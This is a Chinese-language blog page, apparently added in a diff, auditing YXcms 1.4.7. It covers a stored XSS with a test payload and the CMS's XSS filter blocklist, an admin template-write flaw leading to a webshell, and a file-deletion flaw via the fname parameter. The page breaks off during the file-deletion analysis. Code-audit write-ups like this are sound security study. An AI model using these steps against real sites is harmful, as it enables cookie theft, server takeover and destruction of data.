@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="">
+    <meta name="author" content="chuddy">
+    <meta name="keywords" content="">
+    <title>代码审计入门——YXcms ~ chuddy&#39;s Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">代码审计入门——YXcms</p>
+            <br>
+            
+            <p>Monday, May 4th 2020, 3:09 pm</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直想尝试审计一个cms，但是因为各种原因，一直搁置了。<br>尝试分析一下<code>YXCMS</code>。。。</p>
+<h1 id="相关环境"><a href="#相关环境" class="headerlink" title="相关环境"></a>相关环境</h1><p>源码信息 : Yxcms php建站系统 1.4.7<br>本地环境 : phpstudy2018<br>下载地址 : <a href="175.6.244.211:88/uploads/userup/1596/YXcmsApp1.4.7.zip" target="_blank" rel="noopener">175.6.244.211:88/uploads/userup/1596/YXcmsApp1.4.7.zip</a></p>
+<h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><p>具体的安装和使用的详细可以上官网查看<a href="https://www.kancloud.cn/yongheng/yxcms" target="_blank" rel="noopener">https://www.kancloud.cn/yongheng/yxcms</a></p>
+<h1 id="YXcms代码审计"><a href="#YXcms代码审计" class="headerlink" title="YXcms代码审计"></a>YXcms代码审计</h1><h2 id="YXcms目录结构"><a href="#YXcms目录结构" class="headerlink" title="YXcms目录结构"></a>YXcms目录结构</h2><p><a href="https://imgchr.com/i/YPS7h8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/04/YPS7h8.png" alt="YPS7h8.png"></a></p>
+<table>
+<thead>
+<tr>
+<th>YXcms目录结构</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>data</td>
+<td>存放备份数据</td>
+</tr>
+<tr>
+<td>protected</td>
+<td>网站程序核心文件夹</td>
+</tr>
+<tr>
+<td>public</td>
+<td>存放css、images、js、swf等模板公用文件</td>
+</tr>
+<tr>
+<td>upload</td>
+<td>存放上传文件</td>
+</tr>
+<tr>
+<td>.htaccess</td>
+<td>apache伪静态规则文件</td>
+</tr>
+<tr>
+<td>httpd.ini</td>
+<td>iis伪静态规则文件</td>
+</tr>
+<tr>
+<td>index.php</td>
+<td>网站入口</td>
+</tr>
+<tr>
+<td>robots.txt</td>
+<td>robots协议</td>
+</tr>
+<tr>
+<td>升级日志.txt</td>
+<td>详细升级日志记录文件</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>protected文件夹一些重要的路径：</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>protected/base</td>
+<td>控制器、模型以及接口的父类</td>
+</tr>
+<tr>
+<td>protected/cache</td>
+<td>数据库缓存、模板缓存等</td>
+</tr>
+<tr>
+<td>protected/include</td>
+<td>canphp核心</td>
+</tr>
+<tr>
+<td>protected/config.php</td>
+<td>系统全局配置</td>
+</tr>
+<tr>
+<td>protected/core.php</td>
+<td>系统核心函数</td>
+</tr>
+<tr>
+<td>protected/apps</td>
+<td>存放应用</td>
+</tr>
+<tr>
+<td>protected/apps/admin</td>
+<td>后台</td>
+</tr>
+<tr>
+<td>protected/apps/default</td>
+<td>前台</td>
+</tr>
+<tr>
+<td>protected/apps/member</td>
+<td>会员中心</td>
+</tr>
+<tr>
+<td>protected/apps/install</td>
+<td>系统安装</td>
+</tr>
+</tbody>
+</table>
+<p>YXcms1.4.7是mvc路由模式开发的。。。<br>这个版本后台有好几个严重漏洞，<br>前台有一个储存型XSS，要利用也需与管理员交互。</p>
+<p>我们一个一个来进行分析。。。</p>
+<h2 id="前台存储型XSS"><a href="#前台存储型XSS" class="headerlink" title="前台存储型XSS"></a>前台存储型XSS</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>前台有留言板的功能，进行测试：</p>
+<p><img src="https://s1.ax1x.com/2020/05/04/YPUuIs.png" alt="YPUuIs.png"></p>
+<p>当管理员在后台查看留言的时候，就能触发xss：</p>
+<p><img src="https://s1.ax1x.com/2020/05/04/YPUJLF.png" alt="YPUJLF.png"></p>
+<p>可以通过这个<code>xss</code>来获取管理员的<code>cookie</code>，从而进入网站后台。。</p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>让我们看一下代码的实现：<br>首先前台留言板的代码：</p>
+<p>前台的文件源码<code>protected/apps/default/controller/columnController.php</code></p>
+<pre><code>public function index()
+    {
+        $ename=in($_GET[&#39;col&#39;]);
+        if(empty($ename)) throw new Exception(&#39;栏目名不能为空~&#39;, 404);
+        $sortinfo=model(&#39;sort&#39;)-&gt;find(&quot;ename=&#39;{$ename}&#39;&quot;,&#39;id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid&#39;);
+        $path=$sortinfo[&#39;path&#39;].&#39;,&#39;.$sortinfo[&#39;id&#39;];
+        $deep=$sortinfo[&#39;deep&#39;]+1;
+        $this-&gt;col=$ename;
+        switch ($sortinfo[&#39;type&#39;]) {
+            case 1://文章
+                $this-&gt;newslist($sortinfo,$path,$deep);
+                break;
+            case 2://图集
+                $this-&gt;photolist($sortinfo,$path,$deep);
+                break;
+            case 3://单页
+                $this-&gt;page($sortinfo,$path,$deep);
+                break;
+            case 4://应用
+
+                break;
+            case 5://自定义
+
+                break;
+            case 6://表单
+                $this-&gt;extend($sortinfo,$path,$deep);
+                break;
+            default:
+                throw new Exception(&#39;未知的栏目类型~&#39;, 404);
+                break;
+        }
+    }
+
+...
+protected function extend($sortinfo,$path,$deep)
+    {
+        $tableid=$sortinfo[&#39;extendid&#39;];
+        if(empty($tableid)) $this-&gt;error(&#39;表单栏目不存在~&#39;);
+        $tableinfo = model(&#39;extend&#39;)-&gt;select(&quot;id=&#39;{$tableid}&#39; OR pid=&#39;{$tableid}&#39;&quot;,&#39;id,tableinfo,name,type,defvalue&#39;,&#39;pid,norder DESC&#39;);
+        if(empty($tableinfo)) $this-&gt;error(&#39;自定义表不存在~&#39;);
+        $urls=explode(&#39;|&#39;, $sortinfo[&#39;url&#39;]);
+        // var_dump($tableinfo);
+        // var_dump($urls);
+        // exit();
+        if (!$this-&gt;isPost()) {
+           ...
+        }else{
+           session_starts();
+           $verify=session(&#39;verify&#39;);
+           session(&#39;verify&#39;,null);
+           if(empty($verify) || $_POST[&#39;checkcode&#39;]!=$verify) $this-&gt;error(&#39;验证码错误，请重新输入&#39;);
+           for($i=1;$i&lt;count($tableinfo);$i++){
+            if(is_array($_POST[$tableinfo[$i][&#39;tableinfo&#39;]])){
+               $data[$tableinfo[$i][&#39;tableinfo&#39;]]=in(deletehtml(implode(&#39;,&#39;,$_POST[$tableinfo[$i][&#39;tableinfo&#39;]])));
+               $data[$tableinfo[$i][&#39;tableinfo&#39;]]=$data[$tableinfo[$i][&#39;tableinfo&#39;]]?in(deletehtml($data[$tableinfo[$i][&#39;tableinfo&#39;]])):&#39;&#39;;
+            }else{
+                if(strlen($_POST[$tableinfo[$i][&#39;tableinfo&#39;]])&gt;65535) $this-&gt;error(&#39;提交内容超过限制长度~&#39;);
+                $data[$tableinfo[$i][&#39;tableinfo&#39;]]=html_in($_POST[$tableinfo[$i][&#39;tableinfo&#39;]],true);
+            }
+           }
+           $data[&#39;ip&#39;]=get_client_ip();
+           $data[&#39;ispass&#39;]=0;
+           $data[&#39;addtime&#39;]=time();
+           if(empty($urls[1])) $jump=$_SERVER[&#39;HTTP_REFERER&#39;];
+           else{
+              $jurl=explode(&#39;,&#39;,$urls[1]);
+              if(!empty($jurl[1])){
+                $arr=explode(&#39;/&#39;,$jurl[1]);
+                if(!empty($arr)){
+                  $canshu=array();
+                  foreach ($arr as $vo) {
+                     $val=explode(&#39;=&#39;,$vo);
+                     $canshu[$val[0]]=$val[1];
+                  }
+                }
+              }
+              $jump=url($jurl[0],$canshu); 
+           }
+           $mes=$urls[2]?$urls[2]:&#39;提交成功请等待审核~&#39;;
+           if(model(&#39;extend&#39;)-&gt;Extin($tableinfo[0][&#39;tableinfo&#39;],$data)) $this-&gt;success($mes,$jump);
+           else $this-&gt;error(&#39;提交失败~&#39;);
+         }
+    }
+</code></pre><p>这里前端对xss过滤不完善。。<br>只对<code>tname</code>参数进行了验证<code>deletehtml</code>和<code>html_in</code></p>
+<p><code>deletehtml</code>函数<br><code>/protected/include/lib/common.function.php</code></p>
+<pre><code>//去除html js标签
+function deletehtml($document) {
+    $document = trim($document);
+    if (strlen($document) &lt;= 0)
+    {
+      return $document;
+    }
+    $search = array (&quot;&#39;&lt;script[^&gt;]*?&gt;.*?&lt;/script&gt;&#39;si&quot;,  // 去掉 javascript
+                  &quot;&#39;&lt;[\/\!]*?[^&lt;&gt;]*?&gt;&#39;si&quot;,          // 去掉 HTML 标记
+                  &quot;&#39;([\r\n])[\s]+&#39;&quot;,                // 去掉空白字符
+                  &quot;&#39;&amp;(quot|#34);&#39;i&quot;,                // 替换 HTML 实体
+                  &quot;&#39;&amp;(amp|#38);&#39;i&quot;,
+                  &quot;&#39;&amp;(lt|#60);&#39;i&quot;,
+                  &quot;&#39;&amp;(gt|#62);&#39;i&quot;,
+                  &quot;&#39;&amp;(nbsp|#160);&#39;i&quot;
+                  );                    // 作为 PHP 代码运行
+     $replace = array (&quot;&quot;,
+                   &quot;&quot;,
+                   &quot;\\1&quot;,
+                   &quot;\&quot;&quot;,
+                   &quot;&amp;&quot;,
+                   &quot;&lt;&quot;,
+                   &quot;&gt;&quot;,
+                   &quot; &quot;
+                   );
+    return @preg_replace ($search, $replace, $document);
+}
+</code></pre><p><code>html_in</code>函数 对html代码进行xss识别，看是否存在危险的html标签对，并进行过滤<br>使用htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。：</p>
+<p><code>/protected/include/lib/common.function.php</code></p>
+<pre><code>//html代码输入
+function html_in($str,$filter=false){
+    if($filter){
+        $str=RemoveXSS($str);
+    }
+
+    $str=htmlspecialchars($str);
+    if(!get_magic_quotes_gpc()) {
+        $str = addslashes($str);
+    }
+   return $str;
+}
+</code></pre><p><code>RemoveXSS</code>函数 对一些危险的标签对 进行了过滤，使其不能进行正常的xss功能，：</p>
+<pre><code>function RemoveXSS($val) {  
+   // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed  
+   // this prevents some character re-spacing such as &lt;java\0script&gt;  
+   // note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs  
+   $val = preg_replace(&#39;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#39;, &#39;&#39;, $val);  
+
+   // straight replacements, the user should never need these since they&#39;re normal characters  
+   // this prevents like &lt;IMG SRC=@avascript:alert(&#39;XSS&#39;)&gt;  
+   $search = &#39;abcdefghijklmnopqrstuvwxyz&#39;; 
+   $search .= &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;  
+   $search .= &#39;1234567890!@#$%^&amp;*()&#39;; 
+   $search .= &#39;~`&quot;;:?+/={}[]-_|\&#39;\\&#39;; 
+   for ($i = 0; $i &lt; strlen($search); $i++) { 
+      // ;? matches the ;, which is optional 
+      // 0{0,7} matches any padded zeros, which are optional and go up to 8 chars 
+
+      // @ @ search for the hex values 
+      $val = preg_replace(&#39;/(&amp;#[xX]0{0,8}&#39;.dechex(ord($search[$i])).&#39;;?)/i&#39;, $search[$i], $val); // with a ; 
+      // @ @ 0{0,7} matches &#39;0&#39; zero to seven times  
+      $val = preg_replace(&#39;/(&amp;#0{0,8}&#39;.ord($search[$i]).&#39;;?)/&#39;, $search[$i], $val); // with a ; 
+   } 
+
+   // now the only remaining whitespace attacks are \t, \n, and \r 
+   $ra1 = Array(&#39;javascript&#39;, &#39;vbscript&#39;, &#39;expression&#39;, &#39;applet&#39;, &#39;meta&#39;, &#39;xml&#39;, &#39;blink&#39;, &#39;link&#39;, &#39;style&#39;, &#39;script&#39;, &#39;embed&#39;, &#39;object&#39;, &#39;iframe&#39;, &#39;frame&#39;, &#39;frameset&#39;, &#39;ilayer&#39;, &#39;layer&#39;, &#39;bgsound&#39;, &#39;title&#39;, &#39;base&#39;); 
+   $ra2 = Array(&#39;onabort&#39;, &#39;onactivate&#39;, &#39;onafterprint&#39;, &#39;onafterupdate&#39;, &#39;onbeforeactivate&#39;, &#39;onbeforecopy&#39;, &#39;onbeforecut&#39;, &#39;onbeforedeactivate&#39;, &#39;onbeforeeditfocus&#39;, &#39;onbeforepaste&#39;, &#39;onbeforeprint&#39;, &#39;onbeforeunload&#39;, &#39;onbeforeupdate&#39;, &#39;onblur&#39;, &#39;onbounce&#39;, &#39;oncellchange&#39;, &#39;onchange&#39;, &#39;onclick&#39;, &#39;oncontextmenu&#39;, &#39;oncontrolselect&#39;, &#39;oncopy&#39;, &#39;oncut&#39;, &#39;ondataavailable&#39;, &#39;ondatasetchanged&#39;, &#39;ondatasetcomplete&#39;, &#39;ondblclick&#39;, &#39;ondeactivate&#39;, &#39;ondrag&#39;, &#39;ondragend&#39;, &#39;ondragenter&#39;, &#39;ondragleave&#39;, &#39;ondragover&#39;, &#39;ondragstart&#39;, &#39;ondrop&#39;, &#39;onerror&#39;, &#39;onerrorupdate&#39;, &#39;onfilterchange&#39;, &#39;onfinish&#39;, &#39;onfocus&#39;, &#39;onfocusin&#39;, &#39;onfocusout&#39;, &#39;onhelp&#39;, &#39;onkeydown&#39;, &#39;onkeypress&#39;, &#39;onkeyup&#39;, &#39;onlayoutcomplete&#39;, &#39;onload&#39;, &#39;onlosecapture&#39;, &#39;onmousedown&#39;, &#39;onmouseenter&#39;, &#39;onmouseleave&#39;, &#39;onmousemove&#39;, &#39;onmouseout&#39;, &#39;onmouseover&#39;, &#39;onmouseup&#39;, &#39;onmousewheel&#39;, &#39;onmove&#39;, &#39;onmoveend&#39;, &#39;onmovestart&#39;, &#39;onpaste&#39;, &#39;onpropertychange&#39;, &#39;onreadystatechange&#39;, &#39;onreset&#39;, &#39;onresize&#39;, &#39;onresizeend&#39;, &#39;onresizestart&#39;, &#39;onrowenter&#39;, &#39;onrowexit&#39;, &#39;onrowsdelete&#39;, &#39;onrowsinserted&#39;, &#39;onscroll&#39;, &#39;onselect&#39;, &#39;onselectionchange&#39;, &#39;onselectstart&#39;, &#39;onstart&#39;, &#39;onstop&#39;, &#39;onsubmit&#39;, &#39;onunload&#39;); 
+   $ra = array_merge($ra1, $ra2); 
+
+   $found = true; // keep replacing as long as the previous round replaced something 
+   while ($found == true) { 
+      $val_before = $val; 
+      for ($i = 0; $i &lt; sizeof($ra); $i++) { 
+         $pattern = &#39;/&#39;; 
+         for ($j = 0; $j &lt; strlen($ra[$i]); $j++) { 
+            if ($j &gt; 0) { 
+               $pattern .= &#39;(&#39;;  
+               $pattern .= &#39;(&amp;#[xX]0{0,8}([9ab]);)&#39;; 
+               $pattern .= &#39;|&#39;;  
+               $pattern .= &#39;|(&amp;#0{0,8}([9|10|13]);)&#39;; 
+               $pattern .= &#39;)*&#39;; 
+            } 
+            $pattern .= $ra[$i][$j]; 
+         } 
+         $pattern .= &#39;/i&#39;;  
+         $replacement = substr($ra[$i], 0, 2).&#39;&lt;x&gt;&#39;.substr($ra[$i], 2); // add in &lt;&gt; to nerf the tag  
+         $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags  
+         if ($val_before == $val) {  
+            // no replacements were made, so exit the loop  
+            $found = false;  
+         }  
+      }  
+   }  
+   return $val;  
+} 
+</code></pre><p>测试了一下，发现前端输入<code>&lt;svg/onload=alert(1)&gt;</code>在数据库中会被存储为<code>&amp;lt;svg/on&amp;lt;x&amp;gt;load=alert(1)&amp;gt;</code></p>
+<p>我们在来看看后端的代码：<br>后台的文件源码<code>protected/apps/admin/controller/extendfieldController.php</code></p>
+<pre><code>    public function mesedit()
+    {
+        $tableid=intval($_GET[&#39;tabid&#39;]);
+        if(!$this-&gt;checkConPower(&#39;extend&#39;,$tableid)) $this-&gt;error(&#39;您没有权限管理此独立表内容~&#39;);
+        $id=intval($_GET[&#39;id&#39;]);//信息id
+        if(empty($tableid) || empty($id) ) $this-&gt;error(&#39;参数错误~&#39;);
+        $tableinfo = model(&#39;extend&#39;)-&gt;select(&quot;id=&#39;{$tableid}&#39; OR pid=&#39;{$tableid}&#39;&quot;,&#39;id,tableinfo,name,type,defvalue&#39;,&#39;pid,norder DESC&#39;);
+        if(empty($tableinfo)) $this-&gt;error(&#39;自定义表不存在~&#39;);
+        if (!$this-&gt;isPost()) {
+           $info=model(&#39;extend&#39;)-&gt;Extfind($tableinfo[0][&#39;tableinfo&#39;],&quot;id=&#39;{$id}&#39;&quot;);
+           // var_dump($info);
+           // exit();
+           $this-&gt;info=$info;
+           $this-&gt;tableid=$tableid;
+           $this-&gt;id=$id;
+           $this-&gt;tableinfo=$tableinfo;
+           $this-&gt;display();
+        }else{
+           for($i=1;$i&lt;count($tableinfo);$i++){
+               if(is_array($_POST[$tableinfo[$i][&#39;tableinfo&#39;]]))
+                 $data[$tableinfo[$i][&#39;tableinfo&#39;]]=implode(&#39;,&#39;,$_POST[$tableinfo[$i][&#39;tableinfo&#39;]]);
+               else
+                 $data[$tableinfo[$i][&#39;tableinfo&#39;]]=html_in($_POST[$tableinfo[$i][&#39;tableinfo&#39;]]);
+           }
+           if(model(&#39;extend&#39;)-&gt;Extup($tableinfo[0][&#39;tableinfo&#39;],&quot;id=&#39;{$id}&#39;&quot;,$data)) $this-&gt;success(&#39;修改成功~&#39;,url(&#39;extendfield/meslist&#39;,array(&#39;id&#39;=&gt;$tableid)));
+           else $this-&gt;error(&#39;信息修改失败~&#39;);
+         }
+    }
+</code></pre><p>直接从数据库中取值，然后就是正常的给页面返回值了：</p>
+<p>实现代码：<br><code>/protected/apps/admin/view/extendfield_mesedit.php</code></p>
+<pre><code>
+              $cont.=&#39;&#39;;
+              for($i=1;$i&lt;count($tableinfo);$i++){
+                 $cont.= &#39;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&#39;.$tableinfo[$i][&#39;name&#39;].&#39;：&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&#39;;
+                 switch ($tableinfo[$i][&#39;type&#39;]) {
+                       case 1:
+                       $cont.= &#39;&lt;input type=&quot;text&quot; name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; value=&quot;&#39;.$info[$tableinfo[$i][&#39;tableinfo&#39;]].&#39;&quot;&gt;&#39;;
+                       break;
+
+                    case 2:
+                       $cont.= &#39;&lt;textarea name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; style=&quot;width:300px !important; height:80px&quot;&gt;&#39;.$info[$tableinfo[$i][&#39;tableinfo&#39;]].&#39;&lt;/textarea&gt;&#39;;
+                       break;
+
+                    case 3:
+
+                       $cont.= &#39;&lt;textarea class=&quot;editori&quot; name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; style=&quot;width:100%;height:250px;visibility:hidden;&quot;&gt;&#39;.html_out($info[$tableinfo[$i][&#39;tableinfo&#39;]]).&#39;&lt;/textarea&gt;&#39;;
+                       break;
+
+                    case 4:
+                       $cont.= &#39;&lt;select name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; &gt;&#39;;    
+                    $chooses=explode(&quot;\r\n&quot;,$tableinfo[$i][&#39;defvalue&#39;]);
+                    $flog=false;
+                    foreach ($chooses as $vo) {
+                        $vos=explode(&quot;,&quot;,$vo);
+                        if($info[$tableinfo[$i][&#39;tableinfo&#39;]]==$vos[0]) {
+                            $flog=true;
+                            $cont.=&#39;&lt;option selected value=&quot;&#39;.$vos[0].&#39;&quot;&gt;&#39;.$vos[1].&#39;&lt;/option&gt;&#39;;
+                        }else{
+                            $cont.=&#39;&lt;option value=&quot;&#39;.$vos[0].&#39;&quot;&gt;&#39;.$vos[1].&#39;&lt;/option&gt;&#39;;
+                        }
+                    }
+                    if(!$flog) $cont.=&#39;&lt;option selected value=&quot;&quot;&gt;=没有选择=&lt;/option&gt;&#39;;
+                    $cont.= &#39;&lt;/select&gt;&#39;;
+                       break;
+
+                    case 5:
+                       $cont.= &#39;&lt;input name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; id=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;&quot; type=&quot;text&quot;  value=&quot;&#39;.$info[$tableinfo[$i][&#39;tableinfo&#39;]].&#39;&quot; /&gt;&#39;;
+                    $cont.= &#39;&lt;iframe scrolling=&quot;no&quot;; frameborder=&quot;0&quot; src=&quot;&#39;.url(&quot;extendfield/file&quot;,array(&#39;inputName&#39;=&gt;$tableinfo[$i][&#39;tableinfo&#39;])).&#39;&quot; style=&quot;width:300px; height:30px;&quot;&gt;&lt;/iframe&gt;&#39;;
+                       break;
+
+                    case 6:
+                    $chooses=explode(&quot;\r\n&quot;,$tableinfo[$i][&#39;defvalue&#39;]);
+                    foreach ($chooses as $vo) {
+                        $vos=explode(&quot;,&quot;,$vo);
+                        $nowval=array();
+                        $nowval=explode(&quot;,&quot;,$info[$tableinfo[$i][&#39;tableinfo&#39;]]);
+                        $cont.= (in_array($vos[0],$nowval))?$vos[1].&#39;&lt;input checked type=&quot;checkbox&quot; name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;[]&quot; value=&quot;&#39;.$vos[0].&#39;&quot; /&gt;&#39;:$vos[1].&#39;&lt;input type=&quot;checkbox&quot; name=&quot;&#39;.$tableinfo[$i][&#39;tableinfo&#39;].&#39;[]&quot; value=&quot;&#39;.$vos[0].&#39;&quot; /&gt;&lt;br&gt;&#39;;
+                    }
+                       break;
+                 }
+                 $cont.= &#39;&lt;/td&gt;&lt;/tr&gt;&#39;;
+              }
+              echo $cont;
+</code></pre><p>只有<code>case3</code> 使用了<code>html_out</code>函数，</p>
+<p>这个<code>html_out</code>函数操作就很骚。。。<br>在<code>html代码输出</code>利用<code>htmlspecialchars_decode</code>将特殊的 HTML 实体转换回普通字符。。那么上面的被实体化的又被转换了回来。。。就可能会有XSS漏洞。。。</p>
+<p><code>/protected/include/lib/common.function.php</code></p>
+<pre><code>//html代码输出
+function html_out($str){
+    if(function_exists(&#39;htmlspecialchars_decode&#39;))
+        $str=htmlspecialchars_decode($str);
+    else
+        $str=html_entity_decode($str);
+    $str = stripslashes($str);
+    return $str;
+}
+</code></pre><p>别的参数，都被html实体化了为：<code>&amp;lt;svg/on&amp;lt;x&amp;gt;load=alert(2)&amp;gt;</code>  ，只有留言内容用了<code>html_out</code>函数，被转换了回来。。<br>被转换为了<code>&lt;svg/on&lt;x&gt;load=alert(4)&gt;</code>  但是存在<code>&lt;x&gt;</code><br>测试了一下竟然成功xss：<br><img src="https://s1.ax1x.com/2020/05/05/YPxLfU.png" alt="YPxLfU.png"><br>是因为这个富文本编译器的原因导致的<code>xss</code>导致了<code>&lt;x&gt;</code>被吞，只剩下<code>&lt;svg/onload=alert(4)&gt;</code>执行了xss代码。(这里有点不是很清晰，找文章也没找到一个合理的解释，如果有大佬知道原理，请告诉我一下)</p>
+<p>可以利用这个漏洞来获取管理员的<code>cookie</code>，进入后台。。。</p>
+<h2 id="任意文件写入-getshell"><a href="#任意文件写入-getshell" class="headerlink" title="任意文件写入(getshell)"></a>任意文件写入(getshell)</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>进入网站后台。<br><code>/index.php?r=admin/set/tpadd&amp;Mname=default</code><br>新建模板文件：<br><img src="https://s1.ax1x.com/2020/05/05/YiVDXV.png" alt="YiVDXV.png"><br>可以创建任意的文件。。<br>通过目录结构，可以找到新的模板文件的位置<code>/protected/apps/default/view/default/phpinfo.php</code></p>
+<p><img src="https://s1.ax1x.com/2020/05/05/YiZPAg.png" alt="YiZPAg.png"></p>
+<p>可以看到是我们写入的文件被执行了，所有可以写入一句话木马，来进行<code>getshell</code>。。</p>
+<h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>protected/apps/admin/controller/setController.php</code>：</p>
+<pre><code>    public function tpadd()
+    {
+       $tpfile=$_GET[&#39;Mname&#39;];
+       if(empty($tpfile)) $this-&gt;error(&#39;非法操作~&#39;);
+       $templepath=BASE_PATH . $this-&gt;tpath.$tpfile.&#39;/&#39;;
+       if($this-&gt;isPost()){
+            $filename=trim($_POST[&#39;filename&#39;]);
+            $code=stripcslashes($_POST[&#39;code&#39;]);
+            if(empty($filename)||empty($code)) $this-&gt;error(&#39;文件名和内容不能为空&#39;);
+         $filepath=$templepath.$filename.&#39;.php&#39;;
+         if($this-&gt;ifillegal($filepath)) {$this-&gt;error(&#39;非法的文件路径~&#39;);exit;}
+         try{
+            file_put_contents($filepath, $code);
+          } catch(Exception $e) {
+            $this-&gt;error(&#39;模板文件创建失败！&#39;);
+          }    
+          $this-&gt;success(&#39;模板文件创建成功！&#39;,url(&#39;set/tplist&#39;,array(&#39;Mname&#39;=&gt;$tpfile)));
+       }else{
+            $this-&gt;tpfile=$tpfile;
+            $this-&gt;display();
+
+       }
+    }
+</code></pre><p>这里<code>$_GET[&#39;Mname&#39;]</code>是新增模板文件的模板名字。。如果没有就会<code>error(&#39;非法操作~&#39;)</code>;<br>新增模板的文件名和文件内容 是通过<code>post</code>进行传输的。</p>
+<p>这里的文件保存路径就是<code>$templepath=protected/apps/default/view/default/</code></p>
+<p>然后对文件名和文件内容进行了非空验证<code>if(empty($filename)||empty($code)) $this-&gt;error(&#39;文件名和内容不能为空&#39;);</code> 别的没有验证。。。</p>
+<p>验证了一下文件的路径：<code>if($this-&gt;ifillegal($filepath)) {$this-&gt;error(&#39;非法的文件路径~&#39;);exit;}</code><br>追踪这个函数<code>ifillegal</code>:<br>代码位置<code>/protected/apps/admin/controller/setController.php</code></p>
+<pre><code>    protected  function ifillegal($path)
+    {
+       if(strstr($path,&quot;./&quot;)||strstr($path,&quot;.\\&quot;)||!strstr($path,&quot;/view/&quot;)) return true;
+       else return false;
+    }
+</code></pre><p>也没有什么问题，然后就可以创建模板文件了。。</p>
+<p>看完代码发现对文件内容没有任何的要求，直接<code>getshell</code>,这种管理员直接可以创建可执行文件的行为是很危险的。。。</p>
+<h2 id="任意文件删除-一"><a href="#任意文件删除-一" class="headerlink" title="任意文件删除(一)"></a>任意文件删除(一)</h2><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞还是在后台。。。<br>看到了这里有一个删除的按钮<br><img src="https://s1.ax1x.com/2020/05/05/Yiuxw6.png" alt="Yiuxw6.png"></p>
+<p>点击删除，进行抓包：</p>
+<p>通过控制<code>fname</code>参数可以实现任意文件删除的功能。。<br><img src="https://s1.ax1x.com/2020/05/05/YiKk6A.png" alt="YiKk6A.png"></p>
+<h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>protected/apps/admin/controller/filesController.php</code>：</p>
+<pre><code>    public function del()
+    {
+       $dirs=in($_GET[&#39;fname&#39;]);
+       $dirs=str_replace(&#39;,&#39;,&#39;/&#39;,$dirs);
+       $dirs=ROOT_PATH.&#39;upload&#39;.$dirs;
+       if(is_dir($dirs)){del_dir($dirs); echo 1;} 
+       elseif(file_exists($dirs)){
+            if(unlink($dirs)) echo 1;
+       }else echo &#39;文件不存在&#39;; 
+    }
